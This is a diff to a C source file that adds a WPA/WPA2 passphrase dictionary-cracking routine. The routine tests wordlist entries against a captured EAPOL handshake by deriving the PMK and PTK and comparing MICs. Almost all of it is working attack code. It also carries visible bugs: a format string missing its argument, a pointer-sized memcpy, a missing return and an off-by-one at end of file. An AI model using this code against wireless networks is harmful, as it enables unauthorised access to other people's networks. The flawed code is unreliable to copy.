@@ -54,3 +54,59 @@ int hmac_hash(int ver, u8 *key, int hashlen, u8 *buf, int buflen, u8 *mic) {
 	}
 	return 0;
 }
+
+int nextdictword(char *word, FILE *fp) {
+	if (fgets(word, MAXPASSLEN + 1, fp) == NULL) {
+		return -1;
+	}
+	word[strlen(word) - 1] = '\0';
+	if (feof(fp)) {
+		return -1;
+	}
+	return strlen(word);
+}
+
+int dictionary_attack(const char *dictionary_path, struct encrypto_info *info) {
+	FILE *fp;
+	int fret;
+	u8 pmk[32];
+	u8 ptk[64];
+	u8 keymic[16];
+	struct wpa_ptk *ptkset;
+	if (!info->password)
+		info->password = malloc(MAXPASSLEN + 1);
+	if (!info->password) {
+		log_printf(MSG_WARNING, "[%s]Malloc memory failed, with error:%s", strerror(errno));
+	}
+	fp = fopen(dictionary_path, "r");
+	if (fp == NULL) {
+		log_printf(MSG_WARNING, "Couldn't open dictionary, with error:%s", strerror(errno));
+		return -1;
+	}
+	/* TODO : We should break this loop when receive cli break request. */
+	while (feof(fp) == 0) {
+		fret = nextdictword(info->password, fp);
+		if (fret < 0) {
+			break;
+		}
+	
+		/*
+		 * Test length of word. IEEE 802.11i indicates the passphrase
+		 * must be at least 8 characters in length, and no more than 63
+		 * characters in length.
+	 	*/
+		if (fret < 8 || fret > 63) 
+			continue;
+
+		pbkdf2_sha1(info->password, info->SSID, strlen(info->SSID), 4096, pmk, sizeof(pmk));
+		wpa_pmk_to_ptk(pmk, info->AA, info->SA, info->AN, info->SN, ptk, sizeof(ptk));
+	
+		ptkset = (struct wpa_ptk *)ptk;
+		hmac_hash(info->version, ptkset->mic_key, 16, info->eapol, info->eapol_frame_len, keymic);
+
+		if (!memcmp(&info->MIC, &keymic, sizeof(keymic))) {
+			memcpy(&info->ptk, ptkset, sizeof(ptkset));
+			return 0;
+		}
+	}
+}
